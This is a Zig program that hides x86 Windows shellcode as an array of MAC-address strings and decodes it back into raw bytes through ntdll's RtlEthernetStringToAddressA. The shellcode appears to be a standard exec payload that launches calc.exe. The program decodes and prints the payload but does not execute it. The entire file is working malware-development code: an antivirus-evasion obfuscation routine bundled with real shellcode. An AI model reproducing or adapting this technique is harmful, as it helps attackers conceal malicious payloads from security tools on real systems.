const std = @import("std");
const windows = std.os.windows;
const WINAPI = windows.WINAPI;

const MAC_ARRAY: [33][]const u8 = [_][]const u8{
    "fc:e8:82:00:00:00",
    "60:89:e5:31:c0:64",
    "8b:50:30:8b:52:0c",
    "8b:52:14:8b:72:28",
    "0f:b7:4a:26:31:ff",
    "ac:3c:61:7c:02:2c",
    "20:c1:cf:0d:01:c7",
    "e2:f2:52:57:8b:52",
    "10:8b:4a:3c:8b:4c",
    "11:78:e3:48:01:d1",
    "51:8b:59:20:01:d3",
    "8b:49:18:e3:3a:49",
    "8b:34:8b:01:d6:31",
    "ff:ac:c1:cf:0d:01",
    "c7:38:e0:75:f6:03",
    "7d:f8:3b:7d:24:75",
    "e4:58:8b:58:24:01",
    "d3:66:8b:0c:4b:8b",
    "58:1c:01:d3:8b:04",
    "8b:01:d0:89:44:24",
    "24:5b:5b:61:59:5a",
    "51:ff:e0:5f:5f:5a",
    "8b:12:eb:8d:5d:6a",
    "01:8d:85:b2:00:00",
    "00:50:68:31:8b:6f",
    "87:ff:d5:bb:f0:b5",
    "a2:56:68:a6:95:bd",
    "9d:ff:d5:3c:06:7c",
    "0a:80:fb:e0:75:05",
    "bb:47:13:72:6f:6a",
    "00:53:ff:d5:63:61",
    "6c:63:2e:65:78:65",
    "00:00:00:00:00:00"
};
const NUMBER_OF_ELEMENTS: usize = 33;

fn macDeobfuscation(mac_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {
    const ntdll = try windows.kernel32.GetModuleHandleA("NTDLL");
    const RtlEthernetStringToAddressA = @as(
        *const fn([*:0]const u8, [*]?[*:0]const u8, [*]u8) callconv(WINAPI) i32,
        @ptrCast(windows.kernel32.GetProcAddress(ntdll, "RtlEthernetStringToAddressA").?),
    );

    var buffer = try allocator.alloc(u8, mac_array.len * 6);
    var offset: usize = 0;

    for (mac_array) |mac| {
        const c_mac = try allocator.dupeZ(u8, mac);
        defer allocator.free(c_mac);
        var terminator: ?[*:0]const u8 = null;
        const result = RtlEthernetStringToAddressA(c_mac.ptr, &terminator, buffer.ptr + offset);
        if (result != 0) {
            return error.RtlEthernetStringToAddressAFailed;
        }
        offset += 6;
    }

    return buffer;
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shellcode = try macDeobfuscation(&MAC_ARRAY, allocator);
    defer allocator.free(shellcode);
    std.debug.print("Decrypted shellcode length: {}\n", .{shellcode.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{shellcode});
}
